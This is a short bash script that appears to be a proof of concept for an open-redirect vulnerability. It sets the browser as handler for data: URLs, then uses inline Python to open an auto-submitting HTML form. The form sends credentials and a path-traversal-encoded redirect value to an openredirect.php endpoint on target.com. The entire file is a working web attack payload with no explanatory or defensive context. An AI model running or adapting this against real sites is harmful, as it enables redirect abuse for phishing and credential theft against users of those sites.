#!/bin/bash
xdg-mime default `xdg-mime query default x-scheme-handler/http`                         x-scheme-handler/data

python <(cat <<EOF
from urllib import quote
import webbrowser

html = '<form method=GET action=http://target.com/openredirect/openredirect.php><input name=username value="johncena"><input name=redirect value="https://status.github.com/messages/%2e%2e%2f"><input name=password value="12345"></form><script>document.forms[0].submit()</script>'
webbrowser.open_new_tab("data:text/html," + quote(html))
EOF
)
